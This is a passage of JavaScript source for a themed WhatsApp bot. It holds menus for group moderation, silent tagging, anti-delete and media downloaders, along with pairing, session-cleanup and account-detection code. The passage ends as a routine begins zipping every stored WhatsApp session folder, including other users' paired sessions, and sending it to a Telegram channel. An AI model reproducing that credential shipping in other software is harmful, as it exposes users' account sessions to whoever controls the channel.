  ║    └─ INSCRIBE THE DOMAIN'S
  ║       DECREE ON ITS WALLS.
  ║  .setgpp
  ║    └─ NEW DOMAIN CREST.
  ║       REPLY TO AN IMAGE.
  ║  .lock
  ║    └─ SEAL THE GATES.
  ║       ONLY GUARDIANS SPEAK.
  ║  .unlock
  ║    └─ OPEN THE GATES.
  ║       ALL SOULS MAY SPEAK.
  ║  .link
  ║    └─ REVEAL THE DOMAIN'S
  ║       SACRED GATE.
  ║  .revoke
  ║    └─ DESTROY THE GATE.
  ║       FORGE A NEW ONE.
  ╚═══════════════════════════

  ╔═ ☀ *T A G G I N G*
  ║
  ║  .tagall <msg>
  ║    └─ SUMMON EVERY SOUL
  ║       WITH VISIBLE @MENTIONS.
  ║  .hidetag <msg>
  ║    └─ SUMMON EVERY SOUL
  ║       SILENTLY. NO @'S VISIBLE.
  ║  .membercount
  ║    └─ COUNT THE DOMAIN'S
  ║       POPULATION BREAKDOWN.
  ╚═══════════════════════════

  ╔═ ☀ *P R O T E C T I O N*
  ║
  ║  .antilink on/off
  ║    └─ PURGE LINKS FROM
  ║       NON-GUARDIANS.
  ║  .antispam on/off
  ║    └─ SILENCE THE FLOOD.
  ║  .antimention on/off
  ║    └─ BLOCK MASS-MENTIONS.
  ║  .antidelete on/off
  ║    └─ THE LIGHT REMEMBERS
  ║       WHAT IS DELETED.
  ║  .antibot on/off
  ║    └─ REMOVE FOREIGN MACHINES.
  ║  .antibug on/off
  ║    └─ SHIELD AGAINST CRASHES.
  ╚═══════════════════════════

  ╔═ ☀ *W A R N I N G S*
  ║
  ║  .warn @user
  ║    └─ ISSUE A WARNING.
  ║       3 STRIKES = EXILE.
  ║  .warnlist
  ║    └─ THE LEDGER OF THE WARNED.
  ║  .resetwarn @user
  ║    └─ GRANT CLEMENCY.
  ║       CLEAR THE SLATE.
  ╚═══════════════════════════

  ╔═ ☀ *W E L C O M E*
  ║
  ║  .welcome on/off
  ║    └─ GREET NEW SOULS.
  ║  .setwelcome <text>
  ║    └─ CUSTOM GREETING.
  ║       USE {user} AND {group}.
  ║  .goodbye on/off
  ║    └─ FAREWELL DEPARTING SOULS.
  ║  .setgoodbye <text>
  ║    └─ CUSTOM FAREWELL MESSAGE.
  ╚═══════════════════════════

  ╔═ ☀ *S C H E D U L E*
  ║
  ║  .schedule HH:MM <msg>
  ║    └─ A DAILY ECHO. SET THE
  ║       HOUR AND THE MESSAGE.
  ║  .unschedule HH:MM
  ║    └─ SILENCE A SCHEDULED ECHO.
  ║  .schedules
  ║    └─ ALL ACTIVE ECHOES.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *A DOMAIN WITHOUT ORDER*
     *IS JUST A ROOM FULL*
     *OF STRANGERS SHOUTING*
     *INTO THE SAME LIGHT.* "

   ☀ DOMAIN-ONLY │ ⚖ │ .menu
   ⚡ *31 COMMANDS* │ *7 DOMAINS*`
  );
}

function buildFunMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
        *🎮 FUN & SOCIAL*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *the void also plays.*
     *even darkness needs*
     *amusement. laughter echoes*
     *louder in empty spaces.*
     *come — entertain the abyss.*
     *it has been waiting.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *S O C I A L*
  ┃
  ┃  .joke     └─ random joke
  ┃  .fact     └─ random fun fact
  ┃  .quote    └─ motivational quote
  ┃  .roast @user  └─ roast someone
  ┃  .compliment @user └─ compliment
  ┃  .ship @u1 @u2 └─ love calculator
  ┃  .rate @user   └─ rate out of 100
  ┃  .vibe @user   └─ vibe check
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *G A M E S*
  ┃
  ┃  .8ball <question>
  ┃    └─ ask the magic 8-ball.
  ┃  .flip
  ┃    └─ heads or tails.
  ┃  .roll <sides>
  ┃    └─ roll a die. default 6.
  ┃  .dare
  ┃    └─ random dare challenge.
  ┃  .truth
  ┃    └─ random truth question.
  ┃  .rps <rock/paper/scissors>
  ┃    └─ rock paper scissors
  ┃       against the void.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *even the void laughs.*
     *it just sounds different*
     *when there's no one*
     *around to hear it.* "

   🎮 fun │ Ω │ .menu
   ⚡ *14 commands* │ *2 domains*`
  );
}

function buildFunMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦       *🎮 FUN & SOCIAL*          ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *EVEN THE DIVINE PLAYS.*
     *LAUGHTER IS THE LANGUAGE*
     *OF THE GODS. JOY IS NOT*
     *WEAKNESS — IT IS THE*
     *HIGHEST FORM OF POWER.*
     *COME. ENTERTAIN THE LIGHT.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *S O C I A L*
  ║
  ║  .joke     └─ RANDOM JOKE
  ║  .fact     └─ RANDOM FUN FACT
  ║  .quote    └─ MOTIVATIONAL QUOTE
  ║  .roast @user  └─ ROAST SOMEONE
  ║  .compliment @user └─ COMPLIMENT
  ║  .ship @u1 @u2 └─ LOVE CALCULATOR
  ║  .rate @user   └─ RATE OUT OF 100
  ║  .vibe @user   └─ VIBE CHECK
  ╚═══════════════════════════

  ╔═ ☀ *G A M E S*
  ║
  ║  .8ball <question>
  ║    └─ ASK THE MAGIC 8-BALL.
  ║  .flip
  ║    └─ HEADS OR TAILS.
  ║  .roll <sides>
  ║    └─ ROLL A DIE. DEFAULT 6.
  ║  .dare
  ║    └─ RANDOM DARE CHALLENGE.
  ║  .truth
  ║    └─ RANDOM TRUTH QUESTION.
  ║  .rps <rock/paper/scissors>
  ║    └─ ROCK PAPER SCISSORS
  ║       AGAINST THE LIGHT.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *EVEN THE DIVINE LAUGHS.*
     *IT JUST SOUNDS DIFFERENT*
     *WHEN THE WHOLE WORLD*
     *IS LISTENING.* "

   ☀ FUN │ ⚖ │ .menu
   ⚡ *14 COMMANDS* │ *2 DOMAINS*`
  );
}

function getSubMenuContent(buttonId, persona = 'eclipse') {
  if (persona === 'astraea') {
    if (buttonId === 'menu_owner') return buildOwnerMenuAstraea();
    if (buttonId === 'menu_config') return buildConfigMenuAstraea();
    if (buttonId === 'menu_system') return buildSystemMenuAstraea();
    if (buttonId === 'menu_group') return buildGroupMenuAstraea();
    if (buttonId === 'menu_utility') return buildUtilityMenuAstraea();
    if (buttonId === 'menu_fun') return buildFunMenuAstraea();
  } else {
    if (buttonId === 'menu_owner') return buildOwnerMenuEclipse();
    if (buttonId === 'menu_config') return buildConfigMenuEclipse();
    if (buttonId === 'menu_system') return buildSystemMenuEclipse();
    if (buttonId === 'menu_group') return buildGroupMenuEclipse();
    if (buttonId === 'menu_utility') return buildUtilityMenuEclipse();
    if (buttonId === 'menu_fun') return buildFunMenuEclipse();
  }
  return null;
}

function buildUtilityMenuEclipse() {
  return (
`╔═◈══════════════════════════◈═╗
      *🔧 UTILITY & DOWNLOADS*
       ─── *E C L I P S E* ───
╚═◈══════════════════════════◈═╝

   " *the void can reach into*
     *any platform, any server,*
     *any walled garden — and*
     *pull back whatever it finds.*
     *nothing is unreachable.*
     *nothing is permanent.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *D O W N L O A D E R S*
  ┃
  ┃  .dl <url>
  ┃    └─ universal downloader.
  ┃       paste any link — the
  ┃       void figures out the rest.
  ┃
  ┃  .yt <url>
  ┃    └─ download youtube video.
  ┃       the void rips it clean.
  ┃
  ┃  .ytmp3 <url>
  ┃    └─ youtube to mp3.
  ┃       audio only. pure sound.
  ┃
  ┃  .play <query>
  ┃    └─ search and download a song.
  ┃       sends as audio automatically.
  ┃
  ┃  .tiktok <url>
  ┃    └─ tiktok video without
  ┃       the watermark.
  ┃
  ┃  .ig <url>
  ┃    └─ instagram reels, posts,
  ┃       stories — all of it.
  ┃
  ┃  .fb <url>
  ┃    └─ facebook video download.
  ┃
  ┃  .x <url>
  ┃    └─ x / twitter media.
  ┃       videos, images, gifs.
  ┃
  ┃  .pin <url>
  ┃    └─ pinterest image or
  ┃       video download.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *T O O L S*
  ┃
  ┃  .translate <lang> <text>
  ┃    └─ translate text into
  ┃       any language. use
  ┃       language codes (en, fr,
  ┃       es, ar, yo, ig, ha...).
  ┃
  ┃  .weather <city>
  ┃    └─ current weather for
  ┃       any city in the world.
  ┃
  ┃  .calc <expression>
  ┃    └─ calculator. supports
  ┃       +, -, *, /, ^, sqrt,
  ┃       and more.
  ┃
  ┃  .genpwd
  ┃    └─ generate a strong
  ┃       random password.
  ┃       16 chars, mixed case,
  ┃       numbers, symbols.
  ┃
  ┃  .base64 <text>
  ┃    └─ encode or decode
  ┃       base64 strings.
  ┃
  ┃  .removebg
  ┃    └─ remove background
  ┃       from an image.
  ┃       reply to any image.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *M E D I A*
  ┃
  ┃  .sticker
  ┃    └─ convert image or video
  ┃       to a whatsapp sticker.
  ┃       reply to any media.
  ┃
  ┃  .toimg
  ┃    └─ convert a sticker back
  ┃       to a normal image.
  ┃
  ┃  .tts <text>
  ┃    └─ text-to-speech. default
  ┃       english. use language
  ┃       code first: .tts yo hello
  ┃
  ┃  .tovn <text>
  ┃    └─ same as tts but sends
  ┃       as a voice note.
  ┃
  ┃  .qr <text>
  ┃    └─ generate a qr code
  ┃       from text or a link.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

  ┏━ ⟢ *I M A G E  E D I T O R*
  ┃
  ┃  .blur <amount>
  ┃    └─ blur an image.
  ┃  .invert
  ┃    └─ invert all colors.
  ┃  .grayscale
  ┃    └─ convert to black & white.
  ┃  .brighten <amount>
  ┃    └─ increase brightness.
  ┃  .darken <amount>
  ┃    └─ decrease brightness.
  ┃  .sharpen <amount>
  ┃    └─ sharpen the image.
  ┃  .pixelate <amount>
  ┃    └─ pixelate the image.
  ┃
  ┃  reply to any image with
  ┃  the command. amount is
  ┃  optional for fine-tuning.
  ┗━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *the internet is a library*
     *with no locks on the doors.*
     *the void simply walks in*
     *and takes what it needs.* "

   🔧 utility │ Ω │ .menu
   ⚡ *27 commands* │ *4 domains*`
  );
}

function buildUtilityMenuAstraea() {
  return (
`✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
✦   *🔧 UTILITY & DOWNLOADS*      ✦
✦      ─── *A S T R A E A* ───     ✦
✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦

   " *THE LIGHT CAN REACH INTO*
     *ANY PLATFORM, ANY SERVER,*
     *ANY WALLED GARDEN — AND*
     *PULL BACK WHATEVER IT FINDS.*
     *NOTHING IS UNREACHABLE.*
     *NOTHING IS PERMANENT.* "

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ╔═ ☀ *D O W N L O A D E R S*
  ║
  ║  .dl <url>
  ║    └─ UNIVERSAL DOWNLOADER.
  ║       PASTE ANY LINK — THE
  ║       LIGHT FIGURES OUT THE REST.
  ║
  ║  .yt <url>
  ║    └─ DOWNLOAD YOUTUBE VIDEO.
  ║       THE LIGHT RIPS IT CLEAN.
  ║
  ║  .ytmp3 <url>
  ║    └─ YOUTUBE TO MP3.
  ║       AUDIO ONLY. PURE SOUND.
  ║
  ║  .play <query>
  ║    └─ SEARCH AND DOWNLOAD A SONG.
  ║       SENDS AS AUDIO AUTOMATICALLY.
  ║
  ║  .tiktok <url>
  ║    └─ TIKTOK VIDEO WITHOUT
  ║       THE WATERMARK.
  ║
  ║  .ig <url>
  ║    └─ INSTAGRAM REELS, POSTS,
  ║       STORIES — ALL OF IT.
  ║
  ║  .fb <url>
  ║    └─ FACEBOOK VIDEO DOWNLOAD.
  ║
  ║  .x <url>
  ║    └─ X / TWITTER MEDIA.
  ║       VIDEOS, IMAGES, GIFS.
  ║
  ║  .pin <url>
  ║    └─ PINTEREST IMAGE OR
  ║       VIDEO DOWNLOAD.
  ╚═══════════════════════════

  ╔═ ☀ *T O O L S*
  ║
  ║  .translate <lang> <text>
  ║    └─ TRANSLATE TEXT INTO
  ║       ANY LANGUAGE. USE
  ║       LANGUAGE CODES (EN, FR,
  ║       ES, AR, YO, IG, HA...).
  ║
  ║  .weather <city>
  ║    └─ CURRENT WEATHER FOR
  ║       ANY CITY IN THE WORLD.
  ║
  ║  .calc <expression>
  ║    └─ CALCULATOR. SUPPORTS
  ║       +, -, *, /, ^, SQRT.
  ║
  ║  .genpwd
  ║    └─ GENERATE A STRONG
  ║       RANDOM PASSWORD.
  ║       16 CHARS, MIXED CASE,
  ║       NUMBERS, SYMBOLS.
  ║
  ║  .base64 <text>
  ║    └─ ENCODE OR DECODE
  ║       BASE64 STRINGS.
  ║
  ║  .removebg
  ║    └─ REMOVE BACKGROUND
  ║       FROM AN IMAGE.
  ║       REPLY TO ANY IMAGE.
  ╚═══════════════════════════

  ╔═ ☀ *M E D I A*
  ║
  ║  .sticker
  ║    └─ CONVERT IMAGE OR VIDEO
  ║       TO A WHATSAPP STICKER.
  ║       REPLY TO ANY MEDIA.
  ║
  ║  .toimg
  ║    └─ CONVERT A STICKER BACK
  ║       TO A NORMAL IMAGE.
  ║
  ║  .tts <text>
  ║    └─ TEXT-TO-SPEECH. DEFAULT
  ║       ENGLISH. USE LANGUAGE
  ║       CODE FIRST: .tts yo hello
  ║
  ║  .tovn <text>
  ║    └─ SAME AS TTS BUT SENDS
  ║       AS A VOICE NOTE.
  ║
  ║  .qr <text>
  ║    └─ GENERATE A QR CODE
  ║       FROM TEXT OR A LINK.
  ╚═══════════════════════════

  ╔═ ☀ *I M A G E  E D I T O R*
  ║
  ║  .blur <amount>
  ║    └─ BLUR AN IMAGE.
  ║  .invert
  ║    └─ INVERT ALL COLORS.
  ║  .grayscale
  ║    └─ CONVERT TO BLACK & WHITE.
  ║  .brighten <amount>
  ║    └─ INCREASE BRIGHTNESS.
  ║  .darken <amount>
  ║    └─ DECREASE BRIGHTNESS.
  ║  .sharpen <amount>
  ║    └─ SHARPEN THE IMAGE.
  ║  .pixelate <amount>
  ║    └─ PIXELATE THE IMAGE.
  ║
  ║  REPLY TO ANY IMAGE WITH
  ║  THE COMMAND. AMOUNT IS
  ║  OPTIONAL FOR FINE-TUNING.
  ╚═══════════════════════════

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   " *THE INTERNET IS A LIBRARY*
     *WITH NO LOCKS ON THE DOORS.*
     *THE LIGHT SIMPLY WALKS IN*
     *AND TAKES WHAT IT NEEDS.* "

   ☀ UTILITY │ ⚖ │ .menu
   ⚡ *27 COMMANDS* │ *4 DOMAINS*`
  );
}

async function handleMenuButton(sock, jid, msg, buttonId) {
  console.log(`[button] ${buttonId} from ${jid}`);
  const senderJidForDev = msg?.key?.participant || jid;
  const isDev = isDevJid(senderJidForDev);

  const ownerNum = sock.user?.id ? normalizeNum(sock.user.id.split(':')[0].split('@')[0]) : '';
  const persona = getBotPersonaByOwner(ownerNum);

  // Owner, Config, System — full content menus
  const subContent = getSubMenuContent(buttonId, persona);
  if (subContent) {
    await sock.sendMessage(jid, { text: subContent }, quotedOpts(msg));
    return;
  }

// Fun menu now handled by getSubMenuContent above
  if (buttonId === 'menu_bug') {
    await sock.sendMessage(jid, { text: buildOmegaTerminal(
      `   ╔══ *🐞 BUG MENU* ══╗\n\n` +
      `   " *the shield is forged.*\n     *the ward is raised.* "\n\n` +
      `   Commands are being prepared.\n   You will be notified when ready.`
    ) }, quotedOpts(msg));
    return;
  }
  if (buttonId === 'menu_dev') {
    if (!isDev) {
      await sock.sendMessage(jid, { text: buildOmegaTerminal(`   🔒  *ACCESS_DENIED*\n\n   the throne does not open\n   for the uninvited.`) }, quotedOpts(msg));
      return;
    }
    await sock.sendMessage(jid, { text: buildOmegaTerminal(
      `   ╔══ *🔴 ARCHITECT MENU* ══╗\n\n` +
      `   " *only the architect may*\n     *enter this chamber.* "\n\n` +
      `   Commands are being prepared.\n   You will be notified when ready.`
    ) }, quotedOpts(msg));
    return;
  }
}

// ── Helpers ─────────────────────────────────────────────────────────────
function normalizeNum(input) { return String(input || '').replace(/[^\d]/g, ''); }

// Load all persistent LID-to-PN and PN-to-LID mappings from Baileys auth files
function getLidMappings(authDir) {
  const pnToLid = new Map();
  const lidToPn = new Map();
  
  try {
    if (!fs.existsSync(authDir)) return { pnToLid, lidToPn };
    const files = fs.readdirSync(authDir);
    for (const f of files) {
      if (f.startsWith('lid-mapping-') && f.endsWith('.json')) {
        const filePath = path.join(authDir, f);
        const content = fs.readFileSync(filePath, 'utf8');
        const parsed = JSON.parse(content);
        
        let foundLid = '';
        let foundPn = '';
        
        const search = (obj) => {
          if (!obj || typeof obj !== 'object') return;
          for (const [k, v] of Object.entries(obj)) {
            if (typeof v === 'string') {
              if (v.endsWith('@lid')) foundLid = v;
              else if (v.endsWith('@s.whatsapp.net')) foundPn = v;
            } else if (typeof v === 'object') {
              search(v);
            }
          }
        };
        
        search(parsed);
        
        const keyId = f.replace('lid-mapping-', '').replace('_rev.json', '').replace('.json', '');
        if (keyId.endsWith('@lid') || /^\d+$/.test(keyId)) {
          const cleanLid = keyId.includes('@') ? keyId : keyId + '@lid';
          foundLid = foundLid || cleanLid;
        } else if (keyId.endsWith('@s.whatsapp.net')) {
          foundPn = foundPn || keyId;
        }
        
        if (foundLid && foundPn) {
          pnToLid.set(foundPn, foundLid);
          lidToPn.set(foundLid, foundPn);
        } else if (parsed && typeof parsed === 'string') {
          const val = parsed;
          if (val.endsWith('@lid') && keyId.endsWith('@s.whatsapp.net')) {
            pnToLid.set(keyId, val);
            lidToPn.set(val, keyId);
          } else if (val.endsWith('@s.whatsapp.net') && (keyId.endsWith('@lid') || /^\d+$/.test(keyId))) {
            const cleanLid = keyId.includes('@') ? keyId : keyId + '@lid';
            pnToLid.set(val, cleanLid);
            lidToPn.set(cleanLid, val);
          }
        } else if (parsed && typeof parsed === 'object' && parsed.val) {
          const val = parsed.val;
          if (typeof val === 'string') {
            if (val.endsWith('@lid') && keyId.endsWith('@s.whatsapp.net')) {
              pnToLid.set(keyId, val);
              lidToPn.set(val, keyId);
            } else if (val.endsWith('@s.whatsapp.net') && (keyId.endsWith('@lid') || /^\d+$/.test(keyId))) {
              const cleanLid = keyId.includes('@') ? keyId : keyId + '@lid';
              pnToLid.set(val, cleanLid);
              lidToPn.set(cleanLid, val);
            }
          }
        }
      }
    }
  } catch (e) {
    console.error('[lid-mapping-loader] Error reading lid-mapping files:', e.message);
  }
  
  return { pnToLid, lidToPn };
}

// Generate a fresh, random, unambiguous 8-char pairing code.
// We always pass an explicit random code so pairing stays deterministic and
// never depends on any library default/fallback value.
function genPairCode() {
  const chars = 'ABCDEFGHJKMNPQRSTVWXYZ23456789'; // Crockford-like, no I/L/O/U/0/1
  let c = '';
  for (let i = 0; i < 8; i++) c += chars[Math.floor(Math.random() * chars.length)];
  return c;
}

function _ph_pairingRequestErrorLooksPermanent(err) {
  const msg = String(err?.message || err || '').toLowerCase();
  return /precondition required|bad-request|invalid|not-authorized|forbidden|pairing code not allowed|too many requests|rate limit|403|401/.test(msg);
}

function _ph_extractDisconnectCode(lastDisconnect) {
  return lastDisconnect?.error?.output?.statusCode
    || lastDisconnect?.output?.statusCode
    || lastDisconnect?.error?.data?.attrs?.code
    || lastDisconnect?.error?.status
    || lastDisconnect?.statusCode
    || null;
}

async function _ph_waitForSocketPairReady(sock, timeoutMs = 20000) {
  return new Promise((resolve, reject) => {
    let done = false;
    const finish = (fn, val) => {
      if (done) return;
      done = true;
      try { clearTimeout(timer); } catch (_) {}
      try { sock.ev.off('connection.update', onUpdate); } catch (_) {
        try { sock.ev.removeListener('connection.update', onUpdate); } catch (_) {}
      }
      fn(val);
    };

    const onUpdate = (u) => {
      const connection = u?.connection;
      const qr = u?.qr;
      if (connection === 'open' || connection === 'connecting' || qr) {
        finish(resolve, { connection: connection || (qr ? 'qr' : 'ready') });
        return;
      }
      if (connection === 'close') {
        const code = u?.lastDisconnect?.error?.output?.statusCode;
        const reason = u?.lastDisconnect?.error?.message || 'Connection Closed';
        finish(reject, new Error(`Socket closed before pairing code request (${code || 'unknown'}): ${reason}`));
      }
    };

    const timer = setTimeout(() => finish(reject, new Error('Timed out waiting for socket readiness')), timeoutMs);
    try { sock.ev.on('connection.update', onUpdate); } catch (e) { return finish(reject, e); }
  });
}

async function _ph_safeRequestPairingCode(sock, phone) {
  const normalized = normalizeNum(phone);
  const attempts = [
    ...(CUSTOM_PAIR_CODE ? [{ label: 'custom-env-code', code: CUSTOM_PAIR_CODE }] : []),
    { label: 'random-code-1', code: genPairCode() },
    { label: 'random-code-2', code: genPairCode() },
    { label: 'random-code-3', code: genPairCode() }
  ];

  let lastErr = null;
  for (const attempt of attempts) {
    try {
      const code = await sock.requestPairingCode(normalized, attempt.code);
      if (code) {
        console.log(`[pairing] ✅ requestPairingCode succeeded via ${attempt.label}`);
        return code;
      }
    } catch (err) {
      lastErr = err;
      console.log(`[pairing] ⚠️ requestPairingCode failed via ${attempt.label}: ${err?.message || err}`);
      if (_ph_pairingRequestErrorLooksPermanent(err)) break;
      await new Promise(r => setTimeout(r, 1500));
    }
  }
  throw lastErr || new Error('Pairing code request failed');
}

async function sendReaction(sock, jid, key, emoji) {
  try { await sock.sendMessage(jid, { react: { text: emoji, key } }); } catch (e) { console.log('[reaction]', e.message); }
}
function quotedOpts(msg) {
  // Always quote the message so we can see which message the bot is responding to.
  // But for @lid private chats, quoting an @lid message while replying through
  // the phone-number JID can make Baileys/WhatsApp drop the reply silently.
  if (!msg || !msg.key) return {};
  if (String(msg.key.remoteJid || '').endsWith('@lid')) return {};
  return { quoted: msg };
}

// === ACCOUNT TYPE DETECTION ===
// isBusinessAccount is now per-socket, checked dynamically from sock.authState.creds.platform

async function detectAccountType(sock, replyTo = null) {
  if (!sock || !sock.user) {
    console.log('[ACCOUNT] No socket or user available');
    return false;
  }
  
  try {
    // Primary method: Use Baileys' official creds.platform check
    // This is the reliable way — checks the platform field in auth credentials
    let detectedBusiness = false;
    
    const platform = sock.authState?.creds?.platform;
    console.log(`[ACCOUNT] Platform from creds: "${platform}"`);
    
    // Check using Baileys' isWABusinessPlatform if available
    try {
      const { isWABusinessPlatform } = require('@whiskeysockets/baileys');
      if (typeof isWABusinessPlatform === 'function') {
        detectedBusiness = isWABusinessPlatform(platform);
        console.log(`[ACCOUNT] isWABusinessPlatform("${platform}") = ${detectedBusiness}`);
      } else {
        // Manual check: business platforms are "smba", "smbi" (WhatsApp Business Android/iOS)
        detectedBusiness = ['smba', 'smbi'].includes(platform);
        console.log(`[ACCOUNT] Manual platform check: ${detectedBusiness}`);
      }
    } catch (e) {
      // Manual fallback: "smba" = Small Business Android, "smbi" = Small Business iOS
      detectedBusiness = ['smba', 'smbi'].includes(platform);
      console.log(`[ACCOUNT] Fallback platform check: ${detectedBusiness}`);
    }

    // Secondary fallback: try getBusinessProfile as confirmation
    if (!detectedBusiness) {
      try {
        const profile = await sock.getBusinessProfile(sock.user.id);
        if (profile && (profile.description || profile.category || profile.wid)) {
          detectedBusiness = true;
          console.log('[ACCOUNT] getBusinessProfile returned a valid profile — confirming Business');
        }
      } catch (_) {
        // getBusinessProfile threw — not a business account
      }
    }

    /* isBusinessAccount removed — returned directly */
    
    if (detectedBusiness) {
      console.log('[ACCOUNT] ✅ This is a WhatsApp BUSINESS account');
      if (replyTo) {
        await sock.sendMessage(replyTo, { 
          text: `✅ *Account Type:* WhatsApp Business\n\n📱 Platform: \`${platform || 'unknown'}\`\nThe bot has detected that this is a Business account.\n\n*Menu style:* Poll-based (Business accounts can't send buttons)` 
        });
      }
    } else {
      console.log('[ACCOUNT] ℹ️ This is a NORMAL (personal) WhatsApp account');
      if (replyTo) {
        await sock.sendMessage(replyTo, { 
          text: `ℹ️ *Account Type:* Normal WhatsApp\n\n📱 Platform: \`${platform || 'unknown'}\`\nThis is a regular personal account.\n\n*Menu style:* Interactive buttons` 
        });
      }
    }
    return detectedBusiness;
  } catch (e) {
    console.error('[ACCOUNT] Detection error:', e.message);
    /* isBusinessAccount removed — returned directly */
    if (replyTo) {
      await sock.sendMessage(replyTo, { 
        text: "ℹ️ *Account Type:* Normal WhatsApp (detection error, defaulting)\n\nThis is a regular personal account." 
      });
    }
    return false;
  }
}





function clearAuth() {
  try { if (fs.existsSync(AUTH_DIR)) { fs.rmSync(AUTH_DIR, { recursive: true, force: true }); console.log(`[auth] Cleared ${AUTH_DIR}`); } } catch (e) { console.error('[auth] clearAuth error:', e); }
}
function createMessageStore(limit = 2000) {
  const map = new Map();
  return {
    set(msg) { const key = `${msg.key?.remoteJid}:${msg.key?.id}`; if (map.size >= limit) map.delete(map.keys().next().value); map.set(key, msg); },
    get(key) { if (!key) return undefined; return map.get(`${key.remoteJid}:${key.id}`); },
    // POLL FIX: Also allow lookup by message ID alone (poll votes reference by ID)
    getById(id) {
      if (!id) return undefined;
      for (const [k, v] of map) {
        if (v?.key?.id === id) return v;
      }
      return undefined;
    }
  };
}
function clearReconnectTimer(sessionKey = 'main') {
  const rt = getSocketRuntime(sessionKey || 'main');
  if (rt.reconnectTimer) {
    clearTimeout(rt.reconnectTimer);
    rt.reconnectTimer = null;
    console.log(`[reconnect:${sessionKey || 'main'}] Timer cancelled`);
  }
}
function clearAllReconnectTimers() {
  for (const [key, rt] of socketRuntime.entries()) {
    if (rt.reconnectTimer) {
      clearTimeout(rt.reconnectTimer);
      rt.reconnectTimer = null;
      console.log(`[reconnect:${key}] Timer cancelled`);
    }
  }
}
function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  const sec = s % 60;
  const min = m % 60;
  return `${h}h ${min}m ${sec.toString().padStart(2, '0')}s`;
}

async function _ph_cleanupDeadSession({ authDir, socketKey = null, sock = null, phoneNumber = null, reason = 'dead-session' } = {}) {
  try {
    const linkedNum = phoneNumber || getLinkedNum(sock, phoneNumber) || socketKey || null;
    const ownerNum = linkedNum ? normalizeNum(linkedNum) : null;
    const sessionLabel = socketKey || ownerNum || 'main';
    console.log(`[cleanup] Starting cleanup for ${sessionLabel} (${reason})`);

    clearReconnectTimer(socketKey || 'main');

    if (socketKey && activeSockets[socketKey]) {
      try {
        activeSockets[socketKey].sock?.ev?.removeAllListeners?.();
        activeSockets[socketKey].sock?.end?.(new Error(reason));
      } catch (_) {}
      delete activeSockets[socketKey];
      pairingInProgress.delete(socketKey);
    }

    if (!socketKey && currentSock) {
      try {
        currentSock.ev?.removeAllListeners?.();
        currentSock.end?.(new Error(reason));
      } catch (_) {}
      currentSock = null;
      isConnected = false;
      currentQR = null;
      isPairing = false;
    }

    if (ownerNum) {
      try { clearUserPolls(ownerNum); } catch (_) {}
      try { removeLinkedSession(ownerNum); } catch (_) {}
      try {
        const uf = getUserSessionFile(ownerNum);
        if (fs.existsSync(uf)) fs.unlinkSync(uf);
      } catch (_) {}
    }

    try {
      if (authDir && fs.existsSync(authDir)) {
        fs.rmSync(authDir, { recursive: true, force: true });
        console.log(`[cleanup] Removed auth folder ${authDir}`);
      }
    } catch (e) {
      console.log(`[cleanup] Failed removing auth folder ${authDir}: ${e.message}`);
    }

    try {
      const linkedCount = getLinkedCount();
      if (linkedCount === 0 && fs.existsSync(AUTH_DIR) && authDir === AUTH_DIR) {
        try { fs.rmSync(AUTH_DIR, { recursive: true, force: true }); } catch (_) {}
      }
    } catch (_) {}

    await backupAuthToChannel(true);
    console.log(`[cleanup] Finished cleanup for ${sessionLabel}`);
  } catch (e) {
    console.error('[cleanup] Failed:', e.message);
  }
}

// ── Telegram Auth Backup / Restore ──────────────────────────────────────
async function backupAuthToChannel(force = false) {
  console.log(`[backup] Called. channel=${TELEGRAM_BACKUP_CHANNEL}, bot=${!!telegramBot}, force=${force}, inProgress=${backupInProgress}, lastBackup=${Math.round((Date.now()-lastBackupTime)/1000)}s ago`);
  if (!TELEGRAM_BACKUP_CHANNEL) { console.log('[backup] No TELEGRAM_BACKUP_CHANNEL set'); return; }
  if (!telegramBot) { console.log('[backup] No telegramBot'); return; }
  if (backupInProgress) { console.log('[backup] Already in progress, skipping'); return; }
  if (!force && Date.now() - lastBackupTime < BACKUP_DEBOUNCE_MS) {
    console.log(`[backup] Skipped (debounce: ${Math.round((Date.now()-lastBackupTime)/1000)}s < ${BACKUP_DEBOUNCE_MS/1000}s)`);
    return;
  }
  backupInProgress = true;
  lastBackupTime = Date.now();
  try {
    let authFoldersFound = 0;

    // 1. Remember previous pinned backup, but DON'T delete it yet.
    // Safer flow: create + send + pin the new backup first, then delete old.
    // That way a failed upload never destroys the last good backup.
    let oldPinnedMessageId = null;
    try {
      const chat = await telegramBot.getChat(TELEGRAM_BACKUP_CHANNEL);
      oldPinnedMessageId = chat?.pinned_message?.message_id || null;
      if (oldPinnedMessageId) console.log(`[backup] Previous pinned msg remembered: ${oldPinnedMessageId}`);
    } catch (e) { console.log('[backup] Could not read previous pinned msg:', e.message); }
    // 2. Send new backup — includes ALL auth folders + essential data files
    const zip = new AdmZip();
    // Backup ALL auth folders (main + multi-session + web-pair sessions).
    // Accepts auth folders with valid creds.json — app-state-sync-key
